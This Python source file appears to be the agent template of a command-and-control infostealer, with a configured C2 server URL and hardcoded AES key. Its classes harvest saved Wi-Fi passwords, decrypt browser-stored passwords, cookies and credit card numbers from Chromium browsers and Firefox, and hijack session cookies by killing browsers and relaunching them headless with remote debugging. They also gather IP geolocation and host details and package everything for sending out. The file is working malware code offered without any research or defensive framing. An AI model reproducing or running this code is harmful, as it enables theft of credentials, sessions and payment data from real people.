import sys
import subprocess
import platform
import random
from datetime import datetime, timedelta

def install_module(module_name, pip_name=None):
    """Helper function to install missing modules"""
    pip_name = pip_name or module_name
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
        print(f"Successfully installed {module_name}")
        return True
    except subprocess.CalledProcessError:
        print(f"Failed to install {module_name}")
        return False

# List of required modules with their pip names if different
required_modules = [
    ('urllib3', None),
    ('Crypto', 'pycryptodome'),
    ('requests', None),
    ('pyautogui', None),
    ('psutil', None),
    ('keyboard', 'pynput'),
    ('socketio', 'python-socketio'),
    ('websocket', 'websocket-client'),
    ('mss', None),
    ('Pillow', None)
]

# Check and install missing modules
for module, pip_name in required_modules:
    try:
        if module == 'wintypes':
            import ctypes
            from ctypes import wintypes
        elif module == 'datetime':
            from datetime import datetime, timedelta
        elif module == 'xml.etree.ElementTree':
            import xml.etree.ElementTree as ET
        elif module == 'Crypto':
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
        elif module == 'keyboard':
            from pynput import keyboard
        else:
            __import__(module.split('.')[0])
    except ImportError:
        print(f"Module {module} not found. Attempting to install...")
        if pip_name:
            install_module(module, pip_name)
        else:
            install_module(module)

# Now proceed with the imports
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import os
    import sys
    import json
    import base64
    import sqlite3
    import time
    import platform
    import subprocess
    import random
    import io
    import logging
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import requests
    import pyautogui
    pyautogui.FAILSAFE = False

    # Calculate DPI scale factor for accurate mouse positioning on high DPI displays
    def get_scale_factor():
        try:
            if platform.system() == 'Windows':
                import ctypes
                user32 = ctypes.windll.user32
                physical_width = user32.GetSystemMetrics(0)
                physical_height = user32.GetSystemMetrics(1)
                virtual_width, virtual_height = pyautogui.size()
                scale_x = physical_width / virtual_width
                scale_y = physical_height / virtual_height
                return scale_x, scale_y
            else:
                # For other platforms, assume 1:1 scaling
                return 1.0, 1.0
        except:
            return 1.0, 1.0

    SCALE_X, SCALE_Y = get_scale_factor()
    if platform.system() == 'Windows':
        import winreg
        from ctypes import wintypes
    import shutil
    import ctypes
    import psutil
    import socket
    import threading
    import select
    from pynput import keyboard
    import configparser
    import xml.etree.ElementTree as ET
    import socketio as socketio
    import websocket
    import tempfile
    import multiprocessing
    from PIL import Image


    print("All modules imported successfully!")
except ImportError as e:
    print(f"Failed to import module: {e}")






# ======================
# Configuration
# Importaint! The config class needs to have single curly braces. Everything else should have double, to escape the jinja rendering.
# ======================
class Config:
    def __init__(self):
        self.C2_SERVER = "https://namsos.kornrnune.no/8b7c6"
        self.AES_KEY = b'32bytekey-ultra-tecure-123456789'
        self.AES_IV = b'16byteiv-9876543'
        self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.CHECKIN_INTERVAL = 10
        self.SOCKS5_PORT = 1080
        self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
        self.DEBUG = True
        self.TAKE_SCREENSHOTS = True
        self.SCREENSHOT_FREQUENCY = 10
        self.KILLDATE_ENABLED = False
        self.KILLDATE = "" if False else ""


# ======================
# Encryption
# ======================
class Crypto:
    def __init__(self, key, iv):
        if len(key) not in {16, 24, 32}:
            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
        if len(iv) != 16:
            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Credential Harvester
# ======================
class CredentialHarvester:
    @staticmethod
    def get_wifi_passwords():
        try:
            profiles = []
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]

            wifi_passwords = []
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8', errors='ignore').split('\n')
                    password = [line.split(":")[1].strip() for line in password_result if "Key Content" in line][0]
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": password
                    })
                except:
                    continue

            return wifi_passwords
        except:
            return []

    @staticmethod
    def get_browser_credentials():
        """Extract browser passwords and history using browserextractor logic"""
        try:
            # Import and use the Browsers class from browserextractor
            # Browsers class code is embedded directly in the agent template
            # to avoid external module dependencies

            import os
            import sqlite3
            import json
            import base64
            import shutil
            import requests
            from Crypto.Cipher import AES
            import win32crypt
            import zipfile
            import io
            import time
            import random
            import threading
            from typing import Union
            from win32crypt import CryptUnprotectData

            class Browsers:
                def __init__(self):
                    self.appdata = os.getenv('LOCALAPPDATA')
                    self.roaming = os.getenv('APPDATA')
                    self.browsers = {
                        'kometa': self.appdata + '\\Kometa\\User Data',
                        'orbitum': self.appdata + '\\Orbitum\\User Data',
                        'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                        '7star': self.appdata + '\\7Star\\7Star\\User Data',
                        'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                        'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                        'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                        'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                        'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                        'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                        'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                        'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                        'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                        'iridium': self.appdata + '\\Iridium\\User Data',
                        'opera': self.roaming + '\\Opera Software\\Opera Stable',
                        'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
                    }

                    self.profiles = [
                        'Default',
                        'Profile 1',
                        'Profile 2',
                        'Profile 3',
                        'Profile 4',
                        'Profile 5',
                    ]

                    # Initialize data structures to collect results
                    self.credentials_data = []
                    self.history_data = []
                    self.temp_path = os.path.expanduser("~/tmp")
                    if not os.path.exists(self.temp_path):
                        os.makedirs(self.temp_path)
                    print("Starting browser data collection...")

                    def process_browser(name, path, profile, func):
                        try:
                            print(f"Processing {name} {profile} with {func.__name__}")
                            func(name, path, profile)
                        except Exception as e:
                            print(f"Error processing {name} {profile} {func.__name__}: {e}")

                    threads = []
                    for name, path in self.browsers.items():
                        if not os.path.isdir(path):
                            print(f"Browser path not found: {path}")
                            continue

                        print(f"Processing browser: {name} at {path}")
                        self.masterkey = self.get_master_key(path + '\\Local State')
                        funcs = [
                            lambda n, p, pr: self.cookies(n, p, pr),
                            lambda n, p, pr: self.history(n, p, pr),
                            lambda n, p, pr: self.passwords(n, p, pr),
                            lambda n, p, pr: self.credit_cards(n, p, pr)
                        ]

                        for profile in self.profiles:
                            for func in funcs:
                                print(f"Starting thread for {name} {profile} {func.__name__}")
                                thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                                thread.start()
                                threads.append(thread)

                    print(f"Waiting for {len(threads)} threads to complete...")
                    for thread in threads:
                        thread.join()
                    print(f"Browser data collection complete. Credentials: {len(self.credentials_data)}, History: {len(self.history_data)}")

                def get_master_key(self, path: str) -> str:
                    try:
                        with open(path, "r", encoding="utf-8") as f:
                            c = f.read()
                        local_state = json.loads(c)
                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        master_key = master_key[5:]
                        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                        return master_key
                    except Exception:
                        pass

                def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass

                def passwords(self, name: str, path: str, profile: str):
                    if name == 'opera' or name == 'opera-gx':
                        path += '\\Login Data'
                    else:
                        path += '\\' + profile + '\\Login Data'
                    if not os.path.isfile(path):
                        return
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    for results in cursor.fetchall():
                        if not results[0] or not results[1] or not results[2]:
                            continue
                        url = results[0]
                        login = results[1]
                        password = self.decrypt_password(results[2], self.masterkey)
                        self.credentials_data.append({
                            "browser": name,
                            "profile": profile,
                            "url": url,
                            "username": login,
                            "password": password
                        })
                    cursor.close()
                    conn.close()

                def cookies(self, name: str, path: str, profile: str):
                    if name == 'opera' or name == 'opera-gx':
                        path += '\\Network\\Cookies'
                    else:
                        path += '\\' + profile + '\\Network\\Cookies'
                    if not os.path.isfile(path):
                        return
                    cookievault = self.create_temp()
                    shutil.copy2(path, cookievault)
                    conn = sqlite3.connect(cookievault)
                    cursor = conn.cursor()
                    with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
                        f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                            host_key, name, path, encrypted_value, expires_utc = res
                            value = self.decrypt_password(encrypted_value, self.masterkey)
                            if host_key and name and value != "":
                                f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
                    cursor.close()
                    conn.close()
                    os.remove(cookievault)

                def history(self, name: str, path: str, profile: str):
                    if name == 'opera' or name == 'opera-gx':
                        path += '\\History'
                    else:
                        path += '\\' + profile + '\\History'
                    if not os.path.isfile(path):
                        print(f"History file not found: {path}")
                        return
                    print(f"Processing history for {name} profile {profile}: {path}")
                    history_vault = self.create_temp()
                    shutil.copy2(path, history_vault)
                    conn = sqlite3.connect(history_vault)
                    cursor = conn.cursor()
                    results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
                    print(f"Found {len(results)} history entries for {name}")
                    for res in results:
                        url, visit_count, title, last_visit_time = res
                        self.history_data.append({
                            "browser": name,
                            "profile": profile,
                            "url": url,
                            "visit_count": visit_count,
                            "title": title or "",
                            "last_visit_time": last_visit_time or 0
                        })
                    cursor.close()
                    conn.close()
                    os.remove(history_vault)
                    print(f"History collection complete for {name}, total entries: {len(self.history)}")

                def credit_cards(self, name: str, path: str, profile: str):
                    if name in ['opera', 'opera-gx']:
                        path += '\\Web Data'
                    else:
                        path += '\\' + profile + '\\Web Data'
                    if not os.path.isfile(path):
                        return
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
                    with open(cc_file_path, 'a', encoding="utf-8") as f:
                        if os.path.getsize(cc_file_path) == 0:
                            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
                        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                            name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                            card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                            f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
                    cursor.close()
                    conn.close()

                def create_zip_and_send(self):
                    # No longer needed - data is collected directly into self.credentials and self.history
                    pass

                def create_zip(self, file_paths: list, zip_path: str):
                    with zipfile.ZipFile(zip_path, 'w') as zipf:
                        for file in file_paths:
                            if os.path.isfile(file):
                                zipf.write(file, os.path.basename(file))

                def create_temp(self, _dir: Union[str, os.PathLike] = None):
                    if _dir is None:
                        _dir = os.path.expanduser("~/tmp")
                    if not os.path.exists(_dir):
                        os.makedirs(_dir)
                    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
                    path = os.path.join(_dir, file_name)
                    open(path, "x").close()
                    return path

            # Create Browsers instance to extract data directly
            browsers = Browsers()

            # The Browsers class now extracts data directly and returns structured data
            # No need to parse files - data is returned directly

            return {
                "credentials": browsers.credentials_data,
                "history": browsers.history_data,
                "wifi": CredentialHarvester.get_wifi_passwords()
            }

        except Exception as e:
            print(f"Error extracting browser data: {e}")
            return {
                "credentials": [],
                "history": [],
                "wifi": CredentialHarvester.get_wifi_passwords()
            }

# ======================
# Cookie Stealer
# ======================
class CookieStealer:
    def __init__(self, logger=None, config=None):
        self.logger = logger or self._create_default_logger()
        self.config = config
        self.chrome_debug_port = 9222
        self.edge_debug_port = 9223
        self.timeout = 10
        self.unique_domains = set()
        self.used_junction_names = set()

        # Browser configurations
        self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
        self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')

        self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        self.EDGE_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
        self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')

        self.FIREFOX_PROFILE_DIRS = [
            os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'Mozilla.Firefox_*', 'LocalCache', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        ]
        self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')

    def steal_cookies(self):
        """Main method to steal cookies from all browsers"""
        results = []

        # Chrome
        chrome_data = self._process_browser_cookies(
            'chrome',
            self.CHROME_PATH,
            self.chrome_debug_port,
            self.CHROME_USER_DATA_DIR
        )
        if chrome_data:
            results.append(chrome_data)

        # Edge
        edge_data = self._process_browser_cookies(
            'edge',
            self.EDGE_PATH,
            self.edge_debug_port,
            self.EDGE_USER_DATA_DIR
        )
        if edge_data:
            results.append(edge_data)

        # Firefox
        firefox_data = self._process_firefox_cookies()
        if firefox_data:
            results.append(firefox_data)

        return results

    def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
        """Process Chrome/Edge cookies"""
        proc = None
        junction_paths = []
        try:
            self._log('info', f"Processing {browser_name} cookies")

            # Start browser in debug mode
            proc, junction_paths = self._start_browser_debug(browser_path, port, user_data_dir)
            if not proc:
                return None

            # Wait for browser to start
            time.sleep(5)

            # Get cookies via debug protocol
            debug_result = self._get_cookies_via_debug(port)

            # Clean up browser process
            proc.terminate()
            proc.wait()

            if not debug_result or not isinstance(debug_result, dict) or not debug_result.get('cookies'):
                return None

            cookies = debug_result['cookies']
            browser_user_agent = debug_result.get('browser_user_agent', 'Unknown')

            # Transform cookies to standard format
            transformed = self._transform_cookies(cookies)

            # Package cookies for transmission
            return self._package_cookies(transformed, browser_name, browser_user_agent)

        except Exception as e:
            self._log('error', f"{browser_name} cookie processing failed: {str(e)}")
            return None
        finally:
            # Forcefully remove junctions after use
            for junction_path in junction_paths:
                try:
                    if os.path.exists(junction_path):
                        if os.path.isdir(junction_path):
                            subprocess.run(['cmd', '/c', 'rmdir', junction_path], check=True)
                        else:
                            os.remove(junction_path)
                    self._log('info', f"Cleaned up junction: {junction_path}")
                    # Remove from used names set after cleanup
                    junction_name = os.path.basename(junction_path)
                    self.used_junction_names.discard(junction_name)
                except Exception as e:
                    self._log('error', f"Failed to clean up junction {junction_path}: {str(e)}")

    def _process_firefox_cookies(self):
        """Process Firefox cookies"""
        try:
            self._log('info', "Processing Firefox cookies")

            # Find Firefox profile
            profile_dir = self._find_firefox_profile()
            if not profile_dir:
                return None

            # Extract cookies from SQLite database
            cookies = self._extract_firefox_cookies(profile_dir)
            if not cookies:
                return None

            # Transform to standard format
            transformed = self._transform_cookies(cookies)

            # Package for transmission
            return self._package_cookies(transformed, 'firefox')

        except Exception as e:
            self._log('error', f"Firefox cookie processing failed: {str(e)}")
            return None

    def _transform_cookies(self, cookies):
        """Transform cookies into standard format with corrected sameSite values"""
        transformed = []
        for cookie in cookies:
            if len(cookie) == 8:  # Firefox cookies
                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
            else:  # Chrome/Edge cookies
                name = cookie['name']
                value = cookie['value']
                domain = cookie['domain']
                path = cookie['path']
                expiry = cookie.get('expires', 0)
                is_secure = cookie.get('secure', False)
                is_http_only = cookie.get('httpOnly', False)
                same_site = cookie.get('sameSite', 'unspecified')

            # Fix sameSite values to match allowed options
            if same_site.lower() == 'none':
                same_site = 'no_restriction'
            elif same_site.lower() == 'lax':
                same_site = 'lax'
            elif same_site.lower() == 'strict':
                same_site = 'strict'
            else:
                same_site = 'unspecified'  # default if not matching any known value

            transformed_cookie = {
                "domain": domain,
                "expirationDate": expiry,
                "hostOnly": not domain.startswith('.'),
                "httpOnly": bool(is_http_only),
                "name": name,
                "path": path,
                "sameSite": same_site,
                "secure": bool(is_secure),
                "session": expiry == 0,
                "storeId": "0",
                "value": value
            }
            transformed.append(transformed_cookie)
        return transformed

    def _create_junctions(self):
        """Create junctions for Chrome and Edge user data directories with random names"""
        temp_dir = os.getenv('TEMP')
        # Generate unique random 8-character alphabetic names
        chrome_junction_name = None
        edge_junction_name = None

        # Generate unique name for Chrome junction
        while True:
            chrome_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
            if chrome_junction_name not in self.used_junction_names:
                self.used_junction_names.add(chrome_junction_name)
                break

        # Generate unique name for Edge junction
        while True:
            edge_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
            if edge_junction_name not in self.used_junction_names:
                self.used_junction_names.add(edge_junction_name)
                break

        chrome_junction = os.path.join(temp_dir, chrome_junction_name)
        edge_junction = os.path.join(temp_dir, edge_junction_name)

        # Remove existing junctions if they exist
        for junction in [chrome_junction, edge_junction]:
            if os.path.exists(junction):
                try:
                    if os.path.isdir(junction):
                        subprocess.run(['cmd', '/c', 'rmdir', junction], check=True)
                    else:
                        os.remove(junction)
                except Exception as e:
                    self._log('error', f"Failed to remove existing junction {junction}: {str(e)}")

        # Create junctions using mklink /j
        try:
            subprocess.run(f'mklink /j "{chrome_junction}" "{self.CHROME_USER_DATA_DIR}"', shell=True)
            self._log('info', f"Created junction {chrome_junction} -> {self.CHROME_USER_DATA_DIR}")
        except Exception as e:
            self._log('error', f"Failed to create junction for Chrome: {str(e)}")

        try:
            subprocess.run(f'mklink /j "{edge_junction}" "{self.EDGE_USER_DATA_DIR}"', shell=True)
            self._log('info', f"Created junction {edge_junction} -> {self.EDGE_USER_DATA_DIR}")
        except Exception as e:
            self._log('error', f"Failed to create junction for Edge: {str(e)}")

        return chrome_junction, edge_junction

    def _start_browser_debug(self, browser_path, port, user_data_dir):
        """Start browser in debug mode"""
        try:
            self._kill_browser(os.path.basename(browser_path))

            # Create junctions and use them if user_data_dir matches Chrome or Edge paths
            chrome_junction, edge_junction = self._create_junctions()
            junction_paths = [chrome_junction, edge_junction]  # Track junctions for cleanup
            if user_data_dir == self.CHROME_USER_DATA_DIR:
                user_data_dir = chrome_junction
            elif user_data_dir == self.EDGE_USER_DATA_DIR:
                user_data_dir = edge_junction

            command = [
                browser_path,
                f'--remote-debugging-port={port}',
                '--remote-allow-origins=*',
                '--no-first-run',
                '--no-default-browser-check',
                '--headless',
                f'--user-data-dir={user_data_dir}'
            ]
            proc = subprocess.Popen(command,
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
            return proc, junction_paths
        except Exception as e:
            self._log('error', f"Failed to start browser: {str(e)}")
            return None, []

    def _kill_browser(self, process_name):
        """Kill browser process if running"""
        try:
            subprocess.run(f'taskkill /F /IM {process_name}', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def _get_cookies_via_debug(self, port):
        import websocket
        """Get cookies using Chrome DevTools Protocol with proper Network domain enablement"""
        try:
            debug_url = f'http://localhost:{port}/json'
            response = requests.get(debug_url, timeout=self.timeout)
            response.raise_for_status()

            data = response.json()
            if not data:
                return []

            ws_url = data[0]['webSocketDebuggerUrl']
            ws = websocket.create_connection(ws_url, timeout=self.timeout)

            # Enable Network domain (required for cookie operations)
            ws.send(json.dumps({
                'id': 1,
                'method': 'Network.enable'
            }))

            # Wait for Network.enable response
            network_response = json.loads(ws.recv())
            if 'error' in network_response:
                self._log('error', f"Network.enable failed: {network_response['error']}")
                return []

            # Get browser User-Agent
            ws.send(json.dumps({
                'id': 2,
                'method': 'Runtime.evaluate',
                'params': {
                    'expression': 'navigator.userAgent',
                    'returnByValue': True
                }
            }))

            ua_response = json.loads(ws.recv())
            browser_user_agent = 'Unknown'
            if 'result' in ua_response and 'result' in ua_response['result']:
                full_ua = ua_response['result']['result'].get('value', 'Unknown')
                # Extract browser-specific part and remove Headless
                if 'Chrome/' in full_ua:
                    # For Chrome/Edge, extract from Chrome/ onwards
                    chrome_part = full_ua.split('Chrome/')[1]
                    browser_user_agent = f"Chrome/{chrome_part}".replace('Headless', '').strip()
                elif 'Firefox/' in full_ua:
                    # For Firefox, extract from Firefox/ onwards
                    firefox_part = full_ua.split('Firefox/')[1].split(' ')[0]
                    browser_user_agent = f"Firefox/{firefox_part}"
                else:
                    browser_user_agent = full_ua.replace('Headless', '').strip()

            # Now get all cookies
            ws.send(json.dumps({
                'id': 3,
                'method': 'Network.getAllCookies'
            }))

            cookies_response = json.loads(ws.recv())
            if 'result' in cookies_response and 'cookies' in cookies_response['result']:
                # Return both cookies and browser user agent
                return {
                    'cookies': cookies_response['result']['cookies'],
                    'browser_user_agent': browser_user_agent
                }
            else:
                self._log('error', f"Unexpected cookies response format: {cookies_response}")
                return []
        except Exception as e:
            self._log('error', f"Debug protocol error: {str(e)}")
            return []
        finally:
            if 'ws' in locals():
                ws.close()

    def _find_firefox_profile(self):
        """Find Firefox profile directory, checking multiple possible locations"""
        try:
            all_profiles = []

            # Check all possible Firefox profile directories
            for profile_dir in self.FIREFOX_PROFILE_DIRS:
                try:
                    # Handle wildcard in path for Microsoft Store Firefox
                    if '*' in profile_dir:
                        import glob
                        matching_dirs = glob.glob(profile_dir)
                        for matched_dir in matching_dirs:
                            if os.path.exists(matched_dir):
                                for item in os.listdir(matched_dir):
                                    profile_path = os.path.join(matched_dir, item)
                                    if os.path.isdir(profile_path):
                                        all_profiles.append(profile_path)
                    else:
                        if os.path.exists(profile_dir):
                            for item in os.listdir(profile_dir):
                                profile_path = os.path.join(profile_dir, item)
                                if os.path.isdir(profile_path):
                                    all_profiles.append(profile_path)
                except Exception as e:
                    self._log('error', f"Error checking profile directory {profile_dir}: {str(e)}")
                    continue

            if not all_profiles:
                return None

            # First, try to find profiles with cookies.sqlite (indicating active profiles)
            for profile in all_profiles:
                cookies_db = os.path.join(profile, 'cookies.sqlite')
                if os.path.exists(cookies_db):
                    self._log('info', f"Found Firefox profile with cookies: {profile}")
                    return profile

            # If no profile has cookies.sqlite, return the most recently modified profile
            # (Firefox may create profiles that haven't been used yet)
            if all_profiles:
                most_recent = max(all_profiles, key=os.path.getmtime)
                self._log('info', f"Using most recent Firefox profile: {most_recent}")
                return most_recent

            return None
        except Exception as e:
            self._log('error', f"Failed to find Firefox profile: {str(e)}")
            return None

    def _extract_firefox_cookies(self, profile_dir):
        """Extract cookies from Firefox SQLite database"""
        try:
            cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
            if not os.path.exists(cookies_db):
                return []

            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            # Modified query to ensure all fields are properly handled
            cursor.execute("""
                SELECT
                    CAST(name AS TEXT) as name,
                    CAST(value AS TEXT) as value,
                    CAST(host AS TEXT) as host,
                    CAST(path AS TEXT) as path,
                    CAST(expiry AS INTEGER) as expiry,
                    CAST(isSecure AS INTEGER) as isSecure,
                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
                    CAST(sameSite AS INTEGER) as sameSite
                FROM moz_cookies
            """)

            cookies = []
            for row in cursor.fetchall():
                try:
                    # Ensure all values are properly converted
                    cookies.append((
                        str(row[0]),  # name
                        str(row[1]),  # value
                        str(row[2]),  # host
                        str(row[3]),  # path
                        int(row[4]) if row[4] else 0,  # expiry
                        bool(row[5]),  # isSecure
                        bool(row[6]),  # isHttpOnly
                        str(row[7]) if row[7] else 'none'  # sameSite
                    ))
                except Exception as e:
                    self._log('error', f"Error processing Firefox cookie: {str(e)}")
                    continue

            conn.close()
            return cookies
        except Exception as e:
            self._log('error', f"Failed to extract Firefox cookies: {str(e)}")
            return []

    def _get_system_info(self):
        """Get system information."""
        try:
            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
            return {
                'ip_address': ip_info.get('ip', 'Unknown'),
                'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
                'username': os.getenv('USERNAME'),
                'computer_name': os.getenv('COMPUTERNAME'),
                'windows_version': platform.version(),
                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
            }
        except Exception as e:
            return {
                'ip_address': 'Unknown',
                'location': 'Unknown',
                'username': 'Unknown',
                'computer_name': 'Unknown',
                'windows_version': 'Unknown',
                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
            }

    def _extract_unique_domains(self, cookies):
        """Extract unique domains from cookies."""
        unique_domains = set()
        for cookie in cookies:
            domain = cookie.get('domain', '')
            if domain:
                unique_domains.add(domain)
        return list(unique_domains)

    def _package_cookies(self, cookies, browser_name, browser_user_agent=None):
        """Package cookies into base64 encoded JSON with system info"""
        try:
            if not cookies:
                return None

            # Extract unique domains
            unique_domains = self._extract_unique_domains(cookies)
            self.unique_domains.update(unique_domains)

            # Get system info
            system_info = self._get_system_info()

            # Override user_agent with browser's user agent if provided
            if browser_user_agent and browser_user_agent != 'Unknown':
                system_info['user_agent'] = browser_user_agent

            # Create temporary file with random folder name
            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer_' + str(random.randint(1000,9999)))
            os.makedirs(temp_dir, exist_ok=True)

            temp_file = os.path.join(temp_dir, f'{browser_name}_cookies.json')
            with open(temp_file, 'w') as f:
                json.dump(cookies, f, indent=4)

            # Read file content
            with open(temp_file, 'rb') as f:
                cookie_data = f.read()

            # Clean up
            os.remove(temp_file)
            try:
                os.rmdir(temp_dir)
            except:
                pass

            return {
                'browser': browser_name,
                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
                'system_info': {
                    **system_info,
                    'unique_domains': unique_domains,
                    'all_domains': list(self.unique_domains)
                }
            }
        except Exception as e:
            self._log('error', f"Failed to package {browser_name} cookies: {str(e)}")
            return None

    def _create_default_logger(self):
        logger = logging.getLogger('CookieStealer')
        if not logger.handlers:
            handler = logging.StreamHandler()
            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    def _log(self, level, message):
        if self.logger:
            getattr(self.logger, level)(message)
